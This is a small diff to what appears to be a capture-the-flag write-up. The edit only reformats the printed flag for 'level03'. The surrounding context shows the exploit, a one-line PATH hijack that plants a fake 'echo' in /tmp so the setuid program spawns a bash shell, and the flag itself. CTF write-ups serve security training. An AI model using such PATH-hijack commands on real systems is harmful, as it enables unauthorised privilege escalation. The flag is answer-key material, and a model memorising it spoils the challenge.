@@ -108,4 +108,4 @@ Exploit:
 echo "/bin/bash" > /tmp/echo && chmod 777 /tmp/echo && export PATH=/tmp:$PATH && ./level03
 ```
 
-Flag: qi0maab88jeaj46qoumi7maus
+Flag: `qi0maab88jeaj46qoumi7maus`
